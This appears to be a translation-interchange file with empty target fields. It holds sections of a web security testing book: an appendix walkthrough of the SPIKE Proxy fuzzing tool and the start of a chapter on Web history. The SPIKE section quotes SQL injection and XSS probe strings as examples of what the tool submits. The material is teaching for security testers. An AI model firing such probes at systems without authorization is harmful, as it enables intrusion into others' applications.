        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec9.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>SPIKE Proxy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec8.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>SPIKE Proxy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SPIKE Proxy, an open source tool by Dave Aitel, is getting a bit old, but it is still one of the best and most dependable tools out there for testing parameter manipulation and CGI buffer overflow. It is written in Python, so you can customize it easily. It is another local proxy tool with a scanning engine based on VulnXML (which is no longer kept current). Per its documentation, these are its features:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;argscan&amp;mdash;&lt;/span&gt; Tries arguments to scripts looking for injections (SQL, XSS, and so on)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;dirscan&amp;mdash;&lt;/span&gt; Scans for common directories and files</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;overflow&amp;mdash;&lt;/span&gt; Tries to insert large strings into variables and headers to find potential buffer overflows</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;vulnxml&amp;mdash;&lt;/span&gt; Uses a set of known vulnerabilities for testing Web servers</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To get started with SPIKE, download version 1.48 and unzip it to the root of your &lt;tt&gt;C:\&lt;/tt&gt; drive, which is the default. You should now have a directory called &lt;tt&gt;SPIKEProxy&lt;/tt&gt;. Navigate to this directory, and double-click the &lt;tt&gt;runme.bat&lt;/tt&gt; file. (There is a Linux version, too, but after you get SPIKE running, it shouldn't matter which platform you are using.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You need to configure your browser to user &lt;tt&gt;localhost&lt;/tt&gt; as the proxy on port 8080 (again, the defaults). Similar to Paros, surfing to your target Web server is what makes the Web server appear in the management interface. One key difference from Paros, however, is that SPIKE Proxy is managed through your Web browser instead of in a separate application. The Bypass Proxy Server for Local Addresses box should &lt;span class="docEmphasis"&gt;not&lt;/span&gt; be checked; if it is, you will not be able to connect to SPIKE to configure it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In your browser, connect to http://spike.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You should see something like this.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-21. Configuring the browser for use with SPIKEProxy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-22. SPIKEProxy's home page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To the left are numerous configuration options that aren't really necessary to make the tool work. As you can see, we've surfed to the target host (10.3.175.173 port 2040). Here's what the links under the address mean:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Delve into Dir&amp;mdash;&lt;/span&gt; Enter into the directory (in this case, the root of the server).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;argscan&amp;mdash;&lt;/span&gt; If this link has arguments (&lt;a class="docLink" target="_blank" href="http://target.com/link?blah=1"&gt;http://target.com/link?blah=1&lt;/a&gt;), fuzz them. In other words, try to inject random values, characters, SQL, and scripting syntax.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;dirscan&amp;mdash;&lt;/span&gt; Try to find a list of default or common directories within this directory.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;overflow&amp;mdash;&lt;/span&gt; Look for scripts that take arguments with no bounds checking that could potentially be strings so large that they cause a stack overflow.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;VulnXML Tests&amp;mdash;&lt;/span&gt; This is a battery of tests based on common misconfigurations and missing patches. VulnXML was a project that is no longer being updated. Its intent was to catalog known vulnerabilities, which, if still kept current, would have made updating scanners like SPIKE Proxy a simple synchronization process to get the latest XML database. OSVDB has replaced this initiative. Refer to &lt;a class="docLink" target="_blank" href="http://www.osvdb.org"&gt;http://www.osvdb.org&lt;/a&gt; if this is something that interests you.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the command window, SPIKEProxy also outputs a running log. Periodically copy and paste this into a Notepad file (or use the &lt;tt&gt;tee&lt;/tt&gt; utility discussed in &lt;a class="docLink" href="ch08.html#ch08"&gt;Chapter 8&lt;/a&gt;, &amp;quot;Authentication&amp;quot;) while testing for two reasons:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>You won't be able to review a text log file after the fact.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The information in the log window roars past pretty quickly.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Just because SPIKE Proxy is an older tool and VulnXML has been deprecated, the tool will still find issues, even with the VulnXML scans. This is because many sites do not keep their Web server software current, or they do silly things, such as put a backup of all their source in a directory called &lt;tt&gt;backup&lt;/tt&gt; or &lt;tt&gt;bak&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Moving on, it is advisable that you surf around the application, clicking on all the links so that you have all the directories and arguments in the SPIKE Proxy interface. Having completed this part, start using the SPIKE Proxy interface to conduct testing against the surfed content. Start by doing some Delve into Dir to see what kinds of requests and responses were made during your manual surfing, and target some URLs. It is a good idea to launch the dirscan and VulnXML tests on each of the directories. When you find a request that passed arguments, conduct the argscan operation. This is essentially an automated input validation testing component that will try things like &lt;tt&gt;' or&lt;/tt&gt; and &lt;tt&gt;&amp;lt;script&amp;gt;alert("blah")&amp;lt;/script&amp;gt;&lt;/tt&gt; (and many variations) on every parameter. This will point you in the right direction if there are serious issues with input validation or common directory/filenames. If a response looks particularly interesting, you can rewrite the request through SPIKE Proxy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here we see all the header fields and parameters that we can manipulate and then resubmit.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SPIKE's interface is neither overly intuitive nor overly pretty (you will probably get tired of having to click the Refresh button, and the sometimes pervasive &lt;tt&gt;BUGBUG&lt;/tt&gt; message will at times annoy you like the one below), but it works. In addition, SPIKE fills a niche that is composed of a fairly limited number of tools at the moment, at a price that is hard to beat. This was an excellent community contribution by a talented guy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>Absinthe &amp;ndash; blind SQL injection &amp;ndash; have not tested yet.

EOR &amp;ndash; from SensPost &amp;ndash; use @Stake web proxy to generate
 file that EOR reads in for testing; total pile of
 crap that errored constantly when I tried it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-23. Modifying requests through SPIKEProxy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec8.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 1. The Web Is Different</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 1. The Web Is Different</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>The World Wide Web</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>The Price of Web Utopia</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>The Web Versus Client-Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>A Fault Model for Web Apps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Conclusion</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="pref03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter sets the context for working on Web software. If you are new to the field, it provides some background information that you might find especially interesting. Whether you are new or experienced and regardless of your role (manager, tester, developer, or other technical person) on a Web development effort, this chapter sets the stage for understanding the context of your Web project and prepares you for reading the Web attacks presented in subsequent chapters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web is different. Understanding its background and subtleties will help you become more effective.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Software as we know it today was born in the World War II era when war drove the need to compute. We needed bomb trajectories to be more accurate, and we needed to calculate them faster. We needed to decrypt complicated communications so that we would know where opposing ships would be when our own ships had to traverse dangerous waters. When such dire need drives invention, the ensuing growth in technology can be rapid.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The decades following the first use of computers and software saw incredible change. Universities began computer science degree programs. Big business and the government began replacing complicated manual systems with automated ones. Every year new automated solutions replaced old manual solutions until we arrived at the situation as it exists today: Computers and software permeate society. Indeed, it is difficult to get out of bed and make breakfast in the morning without thousands of lines of code executing on our behalf.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Fueled by almost constant innovation, this rapid growth in technology continued unabated even up to the present time. But one innovation eclipsed them all. One innovation stood out in a field full of innovation and</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>would come to change the lives of nearly every computer user on the planet. One innovation has arguably created more users, businesses, and success stories than any other.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>That innovation is the World Wide Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web changes everything. It changes what we know about software engineering, and it forces us to reevaluate tried and true techniques in software testing. Later chapters are reserved for those techniques. In this chapter, we reflect on the changes that the Web brought about and begin to set the stage for studying the testing techniques presented in the rest of this book.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>The World Wide Web</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>The World Wide Web</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Networked computers are not new. We have been connecting computers in local-area (LAN) and wide-area networks (WANs) for longer than we've had the Web. In fact, the Web is a specialized version of what is called a &lt;span class="docEmphStrong"&gt;client-server network&lt;/span&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Client-server networks conserve computing resources by delegating complex and time-consuming computation to powerful, expensive computers called &lt;span class="docEmphStrong"&gt;servers&lt;/span&gt;. Server machines tend to have large storage and memory capacity and multiple, fast processors. Their speed allows them to complete computationally intense processing faster than a typical computer and then &amp;quot;serve&amp;quot; the results to smaller, less powerful machines, called &lt;span class="docEmphStrong"&gt;clients&lt;/span&gt;, over a communication path.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In client-server networks, there are really three things of importance:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The server computer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>One or more client computers</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>A connection between the client and server, called the &lt;span class="docEmphStrong"&gt;network&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The basic idea can be translated like this. A client machine needs some data or network resource (such as a printer). Using the network, the client connects to the server computer and requests that data or resource. The server then completes the requested computation and uses the network to pass the data or results back to the client. (Refer to &lt;a class="docLink" href="#ch01fig01"&gt;Figure 1-1&lt;/a&gt;.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 1-1. The client-server network flowchart.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Obviously, a lot goes into this simple exchange. At the client, software must be developed to connect to the network to send and receive requests and data. It's the same for the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At the network layer, we need protocols to allow the computers to communicate. We have to handle bandwidth issues, lossy transmission of data, collisions, errors, and one or the other computer (or the resource) not being available.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But all of this has been figured out for better or for worse. Protocols like Transmission Control Protocol (TCP), and User Datagram Protocol (UDP), as well as supporting protocols like Internet Protocol (IP), Address Resolution Protocol (ARP), and the Domain Name System (DNS) have been &lt;a name="iddle1279"&gt;&lt;/a&gt;implemented and made easy to use for developers on both the client and server side. The biggest question for us is this: What do we use this awesome computer networking capability for?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Consider that the earliest users of networks were researchers, and the main problem for researchers is access to data. University scientists who were collaborating with industry and government needed to find and access research data and to share that data with their collaborators.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>And while we are at it, why not publicize all of our research for &lt;span class="docEmphasis"&gt;anyone&lt;/span&gt; to access and use? Could we widen our vision of computer networks to include any computer in the world?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Okay, in the twenty-first century, such a thing as a worldwide computer network is pretty run of the mill. But imagine a world where computers were connected via dial-up modems or physical point-to-point connections&amp;mdash;a world of computing built around unconnected or &amp;quot;standalone&amp;quot; machines.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>These limitations prompted a great deal of invention. Over time, widespread networking provided a better alternative to dial up, and the number of connected computers grew. This growth brought with it an increase in the types of applications, information, and resources that people could access over a network.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What eventually became the World Wide Web was born out of this spirit of invention: new network layer protocols, new server software to handle the connections and serve the variety of content demanded by the clients, and new client software to browse remote servers and search through the entire universe of servers for the one that had the required information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Thus the World Wide Web arrived. A network of computers that span the globe and speak the same languages and protocols: HyperText Transfer Protocol (HTTP), Hypertext Markup Language (HTML), eXtensible Markup Language (XML), JavaScript&amp;mdash;building upon, and laying on top of, the existing protocols that made networking widespread in the first instance. But the Web we know today is a far cry from its humble beginnings.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
